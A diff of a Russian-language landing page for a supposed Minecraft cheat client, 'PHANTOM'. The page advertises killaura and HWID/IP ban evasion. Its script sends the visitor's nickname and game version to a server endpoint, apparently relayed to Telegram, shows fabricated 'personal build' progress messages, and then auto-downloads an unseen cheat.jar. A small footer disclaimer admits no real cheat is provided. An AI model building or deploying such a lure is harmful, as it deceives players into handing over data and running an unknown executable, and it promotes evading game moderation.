@@ -2,221 +2,181 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" 
-content="width=device-width, 
-initial-scale=1.0">
-<title>Minecraft Hack</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PHANTOM PREMIUM — Привязка Клиента</title>
 <style>
 /* 
 =========================
-ГЛОБАЛЬНЫЕ НАСТРОЙКИ
+ГЛОБАЛЬНЫЕ НАСТРОЙКИ ЛЕНДИНГА
 =========================
 */
 html, body {
   margin: 0;
   padding: 0;
   min-height: 100vh;
-  background: #0c0c0c; 
+  background: #090909; 
   color: #ffffff; 
-  font-family: Arial, 
-  sans-serif;
-  overflow-y: auto; 
-}
-body { 
-  display: flex; 
-  flex-direction: column;
-  justify-content: center; 
-  align-items: center; 
-  padding: 40px 20px;
-  box-sizing: border-box;
-  /* Убрали жесткий градиент фона, чтобы сквозь него была видна Матрица */
-  background-color: rgba(12, 12, 12, 0.85);
-  position: relative;
+  font-family: 'Segoe UI', Arial, sans-serif;
+  overflow-x: hidden;
 }
 
-/* 1. ДОБАВЛЕННЫЙ СТИЛЬ ДЛЯ МАТРИЦЫ */
-#matrix-bg {
-  position: fixed; 
-  top: 0; 
-  left: 0; 
-  width: 100%; 
-  height: 100%;
-  z-index: -1; /* Задний план */
-  opacity: 0.15; /* Прозрачность, чтобы не слепило */
-  pointer-events: none;
-}
-
-/* 
-=========================
-ГЛАВНАЯ ПАНЕЛЬ ЧИТА
-=========================
-*/
-.container { 
-  background: #141414; 
-  padding: 0 0 30px 0; 
-  border-radius: 12px; 
-  box-shadow: 
-  0 10px 30px 
-  rgba(0,0,0,0.7); 
-  text-align: center; 
-  width: 100%;
-  max-width: 380px; 
-  overflow: hidden;
-  border: 1px solid #222;
-  margin-bottom: 30px;
-  box-sizing: border-box;
-}
-/* 
-=========================
-ВЕРХНИЙ БАННЕР (БАННЕР.JPG)
-=========================
-*/
-.banner {
-  width: 100%;
-  height: 210px;
-  /* Теперь ищет именно твой переименованный banner.jpg */
-  background-image: url('banner.jpg');
-  background-size: cover;
-  background-position: center;
+/* Шапка сайта */
+header {
   display: flex;
+  justify-content: space-between;
   align-items: center;
-  justify-content: center;
-  position: relative;
-  box-sizing: border-box;
+  padding: 20px 40px;
+  background: rgba(15, 15, 15, 0.8);
+  border-bottom: 1px solid #1a1a1a;
+  backdrop-filter: blur(10px);
 }
-.banner::before {
-  content: "";
-  position: absolute;
-  top: 0; left: 0; 
-  width: 100%; height: 100%;
-  background: 
-  linear-gradient(
-    to bottom, 
-    rgba(20,20,20,0.1), 
-    rgba(20,20,20,1)
-  );
-}
-.banner-text {
-  position: relative;
-  font-size: 24px;
+.logo {
+  font-size: 22px;
   font-weight: 900;
   color: #4caf50;
-  text-shadow: 
-  0 3px 10px 
-  rgba(76,175,80,0.5);
   text-transform: uppercase;
+  letter-spacing: 2px;
 }
-/* 
-=========================
-ФОРМА И ПОЛЯ ВВОДА
-=========================
-*/
-.content {
-  padding: 0 30px;
+.status-online {
+  font-size: 13px;
+  color: #4caf50;
+  background: rgba(76, 175, 80, 0.1);
+  padding: 6px 14px;
+  border-radius: 20px;
+  border: 1px solid rgba(76, 175, 80, 0.3);
+}
+
+/* Главный блок на весь экран */
+.hero-section {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+  padding: 60px 20px;
+  background-image: linear-gradient(to bottom, rgba(9,9,9,0.5), #090909), url('banner.jpg');
+  background-size: cover;
+  background-position: center;
+  min-height: 60vh;
+}
+.hero-title {
+  font-size: 48px;
+  font-weight: 900;
+  margin: 0 0 10px 0;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+.hero-subtitle {
+  font-size: 18px;
+  color: #888;
+  max-width: 600px;
+  margin-bottom: 30px;
+}
+
+/* Блок формы привязки */
+.form-section {
+  background: #111111;
+  border: 1px solid #1c1c1c;
+  border-radius: 16px;
+  padding: 40px;
+  width: 100%;
+  max-width: 450px;
+  box-shadow: 0 20px 40px rgba(0,0,0,0.7);
   box-sizing: border-box;
 }
-.promo-tag {
-  background: #4caf50;
-  color: #000;
-  font-size: 11px;
-  font-weight: bold;
-  padding: 4px 10px;
-  border-radius: 20px;
-  display: inline-block;
-  margin-top: 15px;
-}
-h2 { 
-  font-size: 17px; 
-  margin: 10px 0 20px 0; 
-  color: #ccc; 
+.form-section h3 {
+  margin: 0 0 20px 0;
+  font-size: 20px;
+  color: #fff;
 }
 input, select { 
   width: 100%; 
-  padding: 14px; 
-  margin: 8px 0; 
-  border: 1px solid #2a2a2a; 
-  border-radius: 6px; 
-  background: #1a1a1a; 
+  padding: 16px; 
+  margin: 10px 0; 
+  border: 1px solid #222; 
+  border-radius: 8px; 
+  background: #161616; 
   color: #fff; 
   box-sizing: border-box; 
-  font-size: 14px;
+  font-size: 15px;
   transition: 0.3s;
 }
 input:focus, select:focus { 
   border-color: #4caf50; 
-  background: #202020; 
+  background: #1c1c1c; 
   outline: none; 
 }
-/* 
-=========================
-КНОПКА ЗАПУСКА СКАЧИВАНИЯ
-=========================
-*/
 button { 
   width: 100%; 
-  padding: 14px; 
-  background: 
-  linear-gradient(
-    135deg, 
-    #4caf50 0%, 
-    #388e3c 100%
-  ); 
+  padding: 16px; 
+  background: linear-gradient(135deg, #4caf50 0%, #2e7d32 100%); 
   border: none; 
-  border-radius: 6px; 
+  border-radius: 8px; 
   color: white; 
   font-size: 16px; 
   font-weight: bold; 
   cursor: pointer; 
   margin-top: 15px; 
-  box-shadow: 
-  0 4px 15px 
-  rgba(76,175,80,0.3);
+  box-shadow: 0 4px 20px rgba(76,175,80,0.3);
   transition: 0.2s;
+  text-transform: uppercase;
 }
 button:hover { 
-  transform: translateY(-1px); 
-  box-shadow: 
-  0 6px 20px 
-  rgba(76,175,80,0.4); 
+  transform: translateY(-2px); 
+  box-shadow: 0 6px 25px rgba(76,175,80,0.5); 
 }
 button:disabled { 
   background: #333; 
   box-shadow: none; 
   cursor: not-allowed; 
+  transform: none;
 }
-
-/* 4. ДОБАВЛЕННЫЙ СТИЛЬ ДЛЯ ПОЛОСЫ ЗАГРУЗКИ */
-.progress-container { 
-  width: 100%; 
-  background: #1a1a1a; 
-  border-radius: 6px; 
-  margin-top: 20px; 
-  display: none; /* Изначально скрыта */
-  overflow: hidden;
-  border: 1px solid #2a2a2a;
-}
-.progress-bar { 
-  width: 0%; 
-  height: 6px; 
-  background: #4caf50; 
-  transition: width 0.4s ease; 
-}
-
 .status { 
   margin-top: 20px; 
   font-size: 14px; 
   color: #888; 
 }
-/* 
-=========================
-МЕЛКИЙ ТЕКСТ В ПОДВАЛЕ
-=========================
-*/
-.disclaimer {
-  max-width: 380px;
-  font-size: 10px;
-  color: #444;
+
+/* Блок преимуществ / функций чита */
+.features-section {
+  max-width: 1100px;
+  margin: 60px auto;
+  padding: 0 20px;
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+  gap: 25px;
+}
+.feature-card {
+  background: #111;
+  border: 1px solid #1c1c1c;
+  padding: 30px;
+  border-radius: 12px;
+  text-align: left;
+}
+.feature-card h4 {
+  margin: 0 0 10px 0;
+  font-size: 18px;
+  color: #4caf50;
+}
+.feature-card p {
+  margin: 0;
+  font-size: 14px;
+  color: #777;
+  line-height: 1.5;
+}
+
+/* Подвал */
+footer {
+  padding: 40px 20px;
+  background: #070707;
+  border-top: 1px solid #111;
   text-align: center;
+}
+.disclaimer {
+  max-width: 600px;
+  font-size: 11px;
+  color: #333;
+  margin: 0 auto;
   line-height: 1.4;
   user-select: none;
 }
@@ -224,174 +184,99 @@ button:disabled {
 </head>
 <body>
 
-<!-- 1. ДОБАВЛЕННЫЙ ХОЛСТ ДЛЯ МАТРИЦЫ -->
-<canvas id="matrix-bg"></canvas>
+<header>
+  <div class="logo">PHANTOM Client</div>
+  <div class="status-online">● Статус: Обходит RealWorld / MST</div>
+</header>
 
-<div class="container">
-  <div class="banner">
-    <div class="banner-text">
-      Наш чит лучше всех!
+<main>
+  <!-- Главная большая секция -->
+  <section class="hero-section">
+    <h1 class="hero-title">Доминируй в Minecraft вместе с PHANTOM</h1>
+    <p class="hero-subtitle">Лучшие приватные функции, автоматический обход проверок, продвинутая Киллаура и полная незаметность для модерации.</p>
+    
+    <!-- Форма перенесена сюда, стала крупнее -->
+    <div class="form-section">
+      <h3>Привязка Premium подписки</h3>
+      <form id="cheatForm">
+        <input type="text" id="username" placeholder="Ваш игровой ник" required>
+        
+        <select id="version">
+          <option value="1.16.5">Выбрать версию: 1.16.5</option>
+          <option value="1.12.2">Выбрать версию: 1.12.2</option>
+          <option value="1.20.1">Выбрать версию: 1.20.1</option>
+        </select>
+        
+        <button type="submit" id="btn">Скачать PHANTOM (.jar)</button>
+      </form>
+      <div class="status" id="statusText"></div>
     </div>
+  </section>
+
+  <!-- Привлекающие карточки преимуществ ниже -->
+  <section class="features-section">
+    <div class="feature-card">
+      <h4>Умная KillLaura</h4>
+      <p>Идеальные наводки и автоматический расчет дистанции (Reach). Полная кастомизация под любые режимы и античиты.</p>
+    </div>
+    <div class="feature-card">
+      <h4>Обход HWID и IP банов</h4>
+      <p>Встроенная система подмены данных вашего ПК. Заходите на сервера даже после самых жестких блокировок администрацией.</p>
+    </div>
+    <div class="feature-card">
+      <h4>Режим Стелс</h4>
+      <p>Специальные алгоритмы делают ваши движения абсолютно естественными для серверных плагинов и наблюдающих хелперов.</p>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="disclaimer">
+    Данный ресурс создан только в развлекательных целях для съёмки ролика. Никаких настоящих читов вы не получите. Сайт и файлы служат для демонстрации уязвимостей в рамках видео.
   </div>
-  <div class="content">
-    <div class="promo-tag">
-      Обход RW & HW
-    </div>
-    <h2>Привязка Premium</h2>
-    <form id="cheatForm">
-      <input type="text" 
-      id="username" 
-      placeholder="Ваш ник" 
-      required>
-
-      <!-- 2. ДОБАВЛЕННЫЙ ВЫБОР ВЕРСИЙ -->
-      <select id="version">
-        <option value="1.16.5">Версия: 1.16.5</option>
-        <option value="1.12.2">Версия: 1.12.2</option>
-        <option value="1.20.1">Версия: 1.20.1</option>
-      </select>
-
-      <button type="submit" 
-      id="btn">
-        Скачать Обход (.jar)
-      </button>
-    </form>
-
-    <!-- 4. ДОБАВЛЕННЫЙ ПРОГРЕСС-БАР -->
-    <div class="progress-container" id="progressCont">
-      <div class="progress-bar" id="progressBar"></div>
-    </div>
-
-    <div class="status" 
-    id="statusText"></div>
-  </div>
-</div>
-
-<div class="disclaimer">
-Данный ресурс создан только в 
-развлекательных целях для 
-съёмки ролика. Никаких читов 
-вы не получите. Данные нужны 
-для демонстрации уязвимостей.
-</div>
+</footer>
 
 <script>
-// 1. ДОБАВЛЕННЫЙ СКРИПТ ДЛЯ РАБОТЫ МАТРИЦЫ
-const canvas = document.getElementById('matrix-bg');
-const ctx = canvas.getContext('2d');
-canvas.width = window.innerWidth;
-canvas.height = window.innerHeight;
-const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-const fontSize = 16;
-const columns = canvas.width / fontSize;
-const rainDrops = Array(Math.floor(columns)).fill(1);
-
-function drawMatrix() {
-  ctx.fillStyle = 'rgba(12, 12, 12, 0.05)';
-  ctx.fillRect(0, 0, canvas.width, canvas.height);
-  ctx.fillStyle = '#4caf50';
-  ctx.font = fontSize + 'px monospace';
-  for (let i = 0; i < rainDrops.length; i++) {
-    const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
-    ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
-    if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-      rainDrops[i] = 0;
-    }
-    rainDrops[i]++;
-  }
-}
-setInterval(drawMatrix, 30);
-window.addEventListener('resize', () => {
-  canvas.width = window.innerWidth;
-  canvas.height = window.innerHeight;
-});
-
-/* 
-=========================
-ЛОГИКА ОТПРАВКИ ДАННЫХ
-=========================
-*/
-document.getElementById('cheatForm')
-.addEventListener('submit', 
-async function(e) {
+document.getElementById('cheatForm').addEventListener('submit', async function(e) {
   e.preventDefault();
-  const username = 
-  document.getElementById('username')
-  .value;
-  // Получаем выбранную версию
-  const version = 
-  document.getElementById('version')
-  .value;
-  
-  const btn = 
-  document.getElementById('btn');
-  const statusText = 
-  document.getElementById('statusText');
-  
-  // Достаем элементы прогресс-бара
-  const progressCont = document.getElementById('progressCont');
-  const progressBar = document.getElementById('progressBar');
+  const username = document.getElementById('username').value;
+  const version = document.getElementById('version').value;
+  const btn = document.getElementById('btn');
+  const statusText = document.getElementById('statusText');
 
   btn.disabled = true;
-  btn.innerText = "Подключение...";
-  
-  // Показываем полосу загрузки
-  progressCont.style.display = 'block';
-
-  // 4. ДОБАВЛЕННАЯ АНИМАЦИЯ ПОЛОСЫ ЗАГРУЗКИ (Шаги)
-  progressBar.style.width = '20%';
-  statusText.innerText = "Авторизация в системе...";
-  await new Promise(r => setTimeout(r, 800));
-
-  progressBar.style.width = '60%';
-  statusText.innerText = "Генерация HWID ключа...";
-  await new Promise(r => setTimeout(r, 800));
-
-  progressBar.style.width = '90%';
-  statusText.innerText = "Сборка персонального .jar файла...";
-  await new Promise(r => setTimeout(r, 800));
+  btn.innerText = "Подключение к облаку...";
+  statusText.innerText = "Генерация вашего персонального билда...";
 
   try {
-    const response = 
-    await fetch('/api/send', {
+    const response = await fetch('/api/send', {
       method: 'POST',
-      headers: { 
-        'Content-Type': 
-        'application/json' 
-      },
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ 
-        // Отправляем ник сразу вместе с версией в Telegram
         username: username + ` [Версия: ${version}]`
       })
     });
 
     if (response.ok) {
-      // Заполняем полосу до конца
-      progressBar.style.width = '100%';
-      
       setTimeout(() => {
-        statusText.style.color = 
-        "#4caf50";
-        statusText.innerText = 
-        "Успешно сгенерировано!";
+        statusText.style.color = "#4caf50";
+        statusText.innerText = "Успешно! Скачивание началось.";
         btn.innerText = "Скачано";
         
-        // Автоматический старт скачивания файла cheat.jar из корня сайта
+        // Скачивание файла cheat.jar
         const link = document.createElement('a');
         link.href = '/cheat.jar'; 
         link.download = 'cheat.jar';
         document.body.appendChild(link);
         link.click();
         document.body.removeChild(link);
-      }, 500);
+      }, 1000);
     } else {
-      statusText.innerText = 
-      "Ошибка сервера.";
+      statusText.innerText = "Ошибка сервера.";
       btn.disabled = false;
     }
   } catch (err) {
-    statusText.innerText = 
-    "Ошибка сети.";
+    statusText.innerText = "Ошибка сети.";
     btn.disabled = false;
   }
 });
